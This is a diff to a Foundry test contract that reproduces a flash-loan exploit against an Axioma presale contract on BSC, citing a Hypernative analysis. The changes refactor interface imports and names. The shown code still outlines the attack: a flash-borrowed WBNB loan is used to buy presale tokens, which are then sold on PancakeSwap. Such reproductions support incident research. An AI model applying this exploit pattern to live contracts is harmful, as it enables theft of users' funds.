@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IWETH} from "src/interfaces/IWETH.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
 /*
 @Analysis
 https://twitter.com/HypernativeLabs/status/1650382589847302145
@@ -31,15 +37,15 @@ contract ContractTest is Test {
 
     function testExploit() public {
         uint256 flashLoanAmount = 32_500_000_000_000_000_000;
-        address wbnb = DVM(wbnb_usdt_b)._BASE_TOKEN_();
-        DVM(wbnb_usdt_b).flashLoan(flashLoanAmount, 0, address(this), abi.encode(wbnb_usdt_b, wbnb, flashLoanAmount));
+        address wbnb = IDVM(wbnb_usdt_b)._BASE_TOKEN_();
+        IDVM(wbnb_usdt_b).flashLoan(flashLoanAmount, 0, address(this), abi.encode(wbnb_usdt_b, wbnb, flashLoanAmount));
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
-        (address wbnb_usdt_b, address wbnb, uint256 flashLoanAmount) = abi.decode(data, (address, address, uint256));
+        (address wbnb_usdt_b_, address wbnb, uint256 flashLoanAmount) = abi.decode(data, (address, address, uint256));
 
         // 1. buy
-        WETH(wbnb).withdraw(flashLoanAmount);
+        IWETH(wbnb).withdraw(flashLoanAmount);
         IAxiomaPresale(axiomaPresale).buyToken{value: flashLoanAmount}();
 
         // 2. sale
@@ -53,6 +59,7 @@ contract ContractTest is Test {
     }
 
     fallback() external payable {}
+    receive() external payable {}
 
     function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
         IERC20(tokenFrom).approve(pancakeRouter, type(uint256).max);
